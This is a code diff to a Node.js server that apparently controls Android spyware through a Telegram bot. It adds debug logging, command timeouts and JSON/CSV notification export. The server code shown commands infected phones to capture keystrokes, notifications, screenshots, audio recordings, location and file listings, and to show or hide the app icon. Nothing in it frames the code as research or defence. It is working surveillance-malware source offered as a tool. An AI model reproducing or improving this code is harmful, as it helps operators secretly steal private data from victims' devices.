@@ -394,6 +394,7 @@ const DataExtractionKeyboard = (deviceId) => [
     [{ text: '📱 APPS (TXT)', callback_data: `apps_txt_${deviceId}` }, { text: '📱 APPS (HTML)', callback_data: `apps_html_${deviceId}` }],
     [{ text: '⌨️ KEYSTROKES (TXT)', callback_data: `keystrokes_txt_${deviceId}` }, { text: '⌨️ KEYSTROKES (HTML)', callback_data: `keystrokes_html_${deviceId}` }],
     [{ text: '🔔 NOTIFICATIONS (TXT)', callback_data: `notifications_txt_${deviceId}` }, { text: '🔔 NOTIFICATIONS (HTML)', callback_data: `notifications_html_${deviceId}` }],
+    [{ text: '🔔 NOTIFICATIONS (JSON)', callback_data: `notifications_json_${deviceId}` }, { text: '🔔 NOTIFICATIONS (CSV)', callback_data: `notifications_csv_${deviceId}` }],
     [{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]
 ];
 
@@ -406,16 +407,21 @@ const SettingsMenuKeyboard = [
 ];
 
 // ============================================
-// DEVICE MANAGER
+// DEVICE MANAGER WITH DEBUG
 // ============================================
 class DeviceManager {
     constructor() {
         this.devices = new Map();
         this.wsConnections = new Map();
         this.commandCallbacks = new Map();
+        console.log('📱 DeviceManager initialized');
     }
 
     registerDevice(deviceId, ws, deviceInfo) {
+        console.log(`\n🔌 ===== DEVICE CONNECTION =====`);
+        console.log(`Device ID: ${deviceId}`);
+        console.log(`Device Info:`, deviceInfo);
+        
         const deviceKey = encryption.generateDeviceKey();
         
         const device = {
@@ -432,6 +438,10 @@ class DeviceManager {
         this.devices.set(deviceId, device);
         this.wsConnections.set(ws, deviceId);
         
+        console.log(`✅ Device registered successfully`);
+        console.log(`Total connected devices: ${this.devices.size}`);
+        console.log(`==============================\n`);
+        
         return device;
     }
 
@@ -444,8 +454,25 @@ class DeviceManager {
     }
 
     sendCommand(deviceId, command, parameters = {}, callback = null) {
+        console.log(`\n📤 ===== SENDING COMMAND =====`);
+        console.log(`Device ID: ${deviceId}`);
+        console.log(`Command: ${command}`);
+        console.log(`Parameters:`, parameters);
+        
         const device = this.devices.get(deviceId);
-        if (!device) return { success: false, error: 'Device not found' };
+        if (!device) {
+            console.error(`❌ Device not found in manager!`);
+            console.log('Available devices:', Array.from(this.devices.keys()));
+            console.log(`==============================\n`);
+            return { success: false, error: 'Device not found' };
+        }
+
+        console.log('Device found:');
+        console.log(`- Model: ${device.info?.model || 'Unknown'}`);
+        console.log(`- Has WebSocket: ${!!device.ws}`);
+        console.log(`- WebSocket state: ${device.ws ? this.getWsState(device.ws.readyState) : 'none'}`);
+        console.log(`- Last seen: ${new Date(device.lastSeen).toISOString()}`);
+        console.log(`- Pending commands: ${device.pendingCommands.length}`);
 
         const commandId = uuidv4();
         const cmd = {
@@ -457,32 +484,61 @@ class DeviceManager {
 
         if (callback) {
             this.commandCallbacks.set(commandId, callback);
+            console.log(`📝 Callback registered for command ${commandId}`);
             setTimeout(() => {
-                this.commandCallbacks.delete(commandId);
+                if (this.commandCallbacks.has(commandId)) {
+                    console.log(`⏰ Command ${commandId} timed out after 60s`);
+                    this.commandCallbacks.delete(commandId);
+                    if (callback) {
+                        callback(false, null, 'Command timeout - no response from device');
+                    }
+                }
             }, 60000);
         }
 
         try {
             if (device.ws && device.ws.readyState === WebSocket.OPEN) {
-                device.ws.send(JSON.stringify({
+                const message = JSON.stringify({
                     type: 'command',
                     id: commandId,
                     data: cmd
-                }));
+                });
+                
+                console.log(`📨 Sending WebSocket message (${message.length} bytes)`);
+                device.ws.send(message);
                 
                 db.run(`INSERT INTO commands (id, device_id, command, parameters, status, created_at)
                     VALUES (?, ?, ?, ?, 'sent', ?)`,
                     [commandId, deviceId, command, JSON.stringify(parameters), Date.now()]
                 );
                 
+                console.log(`✅ Command ${commandId} sent successfully`);
+                console.log(`==============================\n`);
                 return { success: true, commandId };
             } else {
+                console.log(`📦 Device not connected, queueing command`);
+                const state = device.ws ? device.ws.readyState : 'no socket';
+                console.log(`WebSocket state: ${this.getWsState(state)}`);
+                
                 device.pendingCommands.push(cmd);
+                console.log(`📦 Command queued. Total pending: ${device.pendingCommands.length}`);
+                console.log(`==============================\n`);
                 return { success: true, commandId, queued: true };
             }
         } catch (error) {
-            console.error(`Error sending command to ${deviceId}:`, error);
+            console.error(`❌ Error sending command to ${deviceId}:`, error);
+            console.log(`==============================\n`);
             return { success: false, error: error.message };
+        }
+    }
+
+    getWsState(state) {
+        switch(state) {
+            case 0: return 'CONNECTING';
+            case 1: return 'OPEN';
+            case 2: return 'CLOSING';
+            case 3: return 'CLOSED';
+            default: return 'UNKNOWN';
         }
     }
 
@@ -495,6 +551,9 @@ class DeviceManager {
     }
 
     disconnectDevice(deviceId) {
+        console.log(`\n🔌 ===== DEVICE DISCONNECTED =====`);
+        console.log(`Device ID: ${deviceId}`);
+        
         const device = this.devices.get(deviceId);
         if (device) {
             if (device.ws) {
@@ -503,6 +562,10 @@ class DeviceManager {
             this.devices.delete(deviceId);
             
             db.run(`UPDATE devices SET is_active = 0 WHERE id = ?`, [deviceId]);
+            
+            console.log(`✅ Device removed from manager`);
+            console.log(`Total connected devices: ${this.devices.size}`);
+            console.log(`==============================\n`);
         }
     }
 }
@@ -546,6 +609,7 @@ wss.on('connection', (ws, req) => {
     ws.on('message', async (data) => {
         try {
             const message = JSON.parse(data);
+            console.log(`📩 WebSocket message from ${deviceId}:`, message.type);
             
             switch (message.type) {
                 case 'pong':
@@ -588,6 +652,9 @@ wss.on('connection', (ws, req) => {
                 case 'installed_apps':
                     await handleInstalledApps(deviceId, message.data);
                     break;
+                    
+                default:
+                    console.log('Unknown message type:', message.type);
             }
         } catch (error) {
             console.error('Error processing message:', error);
@@ -600,6 +667,10 @@ wss.on('connection', (ws, req) => {
             `❌ *Device Disconnected*\nModel: ${device.info.model || 'Unknown'}`);
     });
 
+    ws.on('error', (error) => {
+        console.error(`WebSocket error for device ${deviceId}:`, error);
+    });
+
     ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
 });
 
@@ -609,15 +680,28 @@ wss.on('connection', (ws, req) => {
 async function handleDeviceResponse(deviceId, message) {
     const { commandId, success, data, error } = message;
     
+    console.log(`\n📥 ===== DEVICE RESPONSE =====`);
+    console.log(`Device ID: ${deviceId}`);
+    console.log(`Command ID: ${commandId}`);
+    console.log(`Success: ${success}`);
+    console.log(`Error: ${error || 'none'}`);
+    if (data) {
+        console.log(`Data:`, JSON.stringify(data).substring(0, 200));
+    }
+    
     db.run(`UPDATE commands SET status = ?, result = ?, executed_at = ? WHERE id = ?`,
         [success ? 'completed' : 'failed', JSON.stringify(data || error), Date.now(), commandId]
     );
 
     const callback = deviceManager.commandCallbacks.get(commandId);
     if (callback) {
+        console.log(`📞 Executing callback for command ${commandId}`);
         callback(success, data, error);
         deviceManager.commandCallbacks.delete(commandId);
+    } else {
+        console.log(`⚠️ No callback found for command ${commandId}`);
     }
+    console.log(`==============================\n`);
 }
 
 async function handleDeviceLocation(deviceId, locationData) {
@@ -657,6 +741,8 @@ async function handleKeystroke(deviceId, data) {
 }
 
 async function handleNotification(deviceId, data) {
+    console.log(`🔔 Notification received from ${deviceId}:`, data);
+    
     db.run(`INSERT INTO notifications (device_id, package, title, text, timestamp)
         VALUES (?, ?, ?, ?, ?)`,
         [deviceId, data.package, data.title, data.text, data.timestamp || Date.now()]
@@ -940,7 +1026,8 @@ app.get('/api/data/:deviceId/:type', (req, res) => {
 // TELEGRAM WEBHOOK HANDLER
 // ============================================
 app.post('/webhook', async (req, res) => {
-    console.log('📨 Webhook received:', JSON.stringify(req.body, null, 2));
+    console.log('\n📨 ===== WEBHOOK RECEIVED =====');
+    console.log('Update:', JSON.stringify(req.body, null, 2));
     
     res.sendStatus(200);
 
@@ -955,6 +1042,7 @@ app.post('/webhook', async (req, res) => {
     } catch (error) {
         console.error('Error processing webhook:', error);
     }
+    console.log('==============================\n');
 });
 
 async function handleTelegramMessage(message) {
@@ -1431,12 +1519,17 @@ async function showHelpMenu(chatId, messageId) {
 // ============================================
 
 async function takeScreenshot(chatId, messageId, deviceId) {
+    console.log(`\n📸 ===== TAKING SCREENSHOT =====`);
+    console.log(`Device ID: ${deviceId}`);
+    
     await editMessageText(chatId, messageId,
         `📸 *Taking Screenshot*\n\n⏳ Please wait...`,
         [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
     );
 
     const result = deviceManager.sendCommand(deviceId, 'take_screenshot', {}, (success, data, error) => {
+        console.log(`📥 Screenshot response:`, { success, error });
+        
         if (success) {
             editMessageText(chatId, messageId,
                 `✅ *Screenshot captured successfully!*\n\nProcessing and uploading...`,
@@ -1451,20 +1544,28 @@ async function takeScreenshot(chatId, messageId, deviceId) {
     });
 
     if (!result.success) {
+        console.error(`❌ Failed to send screenshot command:`, result.error);
         await editMessageText(chatId, messageId,
             `❌ *Failed to send command*\n\nDevice may be offline.`,
             [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
         );
     }
+    console.log(`==============================\n`);
 }
 
 async function startRecording(chatId, messageId, deviceId, seconds) {
+    console.log(`\n🎤 ===== STARTING RECORDING =====`);
+    console.log(`Device ID: ${deviceId}`);
+    console.log(`Duration: ${seconds}s`);
+    
     await editMessageText(chatId, messageId,
         `🎤 *Starting Recording*\n\nDuration: ${seconds}s\n⏳ Please wait...`,
         [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
     );
 
     const result = deviceManager.sendCommand(deviceId, 'record_audio', { seconds }, (success, data, error) => {
+        console.log(`📥 Recording response:`, { success, error });
+        
         if (success) {
             editMessageText(chatId, messageId,
                 `✅ *Recording completed!*\n\nProcessing and uploading...`,
@@ -1484,9 +1585,13 @@ async function startRecording(chatId, messageId, deviceId, seconds) {
             [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
         );
     }
+    console.log(`==============================\n`);
 }
 
 async function getLocation(chatId, messageId, deviceId) {
+    console.log(`\n📍 ===== GETTING LOCATION =====`);
+    console.log(`Device ID: ${deviceId}`);
+    
     await editMessageText(chatId, messageId,
         `📍 *Getting Location*\n\n⏳ Please wait...`,
         [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
@@ -1507,9 +1612,13 @@ async function getLocation(chatId, messageId, deviceId) {
             [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
         );
     }
+    console.log(`==============================\n`);
 }
 
 async function listFiles(chatId, messageId, deviceId) {
+    console.log(`\n📁 ===== LISTING FILES =====`);
+    console.log(`Device ID: ${deviceId}`);
+    
     await editMessageText(chatId, messageId,
         `📁 *Listing Files*\n\nDefault path: /sdcard\n⏳ Please wait...`,
         [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
@@ -1538,28 +1647,68 @@ async function listFiles(chatId, messageId, deviceId) {
             );
         }
     });
+    console.log(`==============================\n`);
 }
 
 async function extractData(chatId, messageId, deviceId, dataType, format) {
+    console.log(`\n📊 ===== EXTRACTING DATA =====`);
+    console.log(`Device ID: ${deviceId}`);
+    console.log(`Data Type: ${dataType}`);
+    console.log(`Format: ${format}`);
+    
     await editMessageText(chatId, messageId,
         `📊 *Extracting ${dataType}*\n\nFormat: ${format.toUpperCase()}\n⏳ Please wait...`,
         [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
     );
 
+    // First check if device is connected
+    const device = deviceManager.devices.get(deviceId);
+    console.log('Device connection status:', device ? 'Connected' : 'Not connected');
+    if (device) {
+        console.log('WebSocket state:', device.ws ? device.ws.readyState : 'No WebSocket');
+    }
+
     const command = `get_${dataType}_${format}`;
+    console.log(`📤 Sending command: ${command}`);
+    
     const result = deviceManager.sendCommand(deviceId, command, {}, (success, data, error) => {
+        console.log(`📥 Command response for ${command}:`, { success, error, data });
+        
         if (success) {
-            editMessageText(chatId, messageId,
-                `✅ *${dataType} extracted successfully!*\n\nFile will be uploaded shortly.`,
+            let responseText = `✅ *${dataType} extracted successfully!*\n\n`;
+            responseText += `Format: ${format.toUpperCase()}\n`;
+            
+            if (data && data.count !== undefined) {
+                responseText += `Count: ${data.count}\n`;
+            }
+            if (data && data.file) {
+                responseText += `File: ${data.file}\n`;
+            }
+            if (data && data.message) {
+                responseText += `\n${data.message}`;
+            }
+            
+            editMessageText(chatId, messageId, responseText,
                 [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
             );
         } else {
             editMessageText(chatId, messageId,
-                `❌ *Extraction Failed*\n\nError: ${error || 'Unknown error'}`,
+                `❌ *Extraction Failed*\n\nError: ${error || 'Unknown error'}\nCommand: ${command}`,
                 [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
             );
         }
     });
+
+    console.log('sendCommand result:', result);
+    
+    if (!result.success) {
+        console.error(`❌ Failed to send command:`, result.error);
+        await editMessageText(chatId, messageId,
+            `❌ *Failed to send command*\n\nError: ${result.error || 'Device may be offline'}\nDevice ID: ${deviceId}`,
+            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
+        );
+    }
+    console.log(`==============================\n`);
 }
 
 async function getBatteryStatus(chatId, messageId, deviceId) {
@@ -1725,7 +1874,7 @@ async function showIcon(chatId, messageId, deviceId) {
         } else {
             editMessageText(chatId, messageId,
                 `❌ *Failed to show icon*\n\nError: ${error || 'Unknown error'}`,
-                [[{ text: '🔙 BACK', callback_data: `device_{deviceId}` }]]
+                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
             );
         }
     });
@@ -1851,6 +2000,7 @@ server.listen(config.server.port, config.server.host, () => {
     console.log(`   └─ Device Management`);
     console.log(`   └─ Multiple Format Support (TXT, HTML, JSON, CSV)`);
     console.log(`   └─ Auto Cleanup`);
+    console.log(`   └─ Comprehensive Debug Logging`);
     console.log(`\n🚀 ===============================================\n`);
 });
 
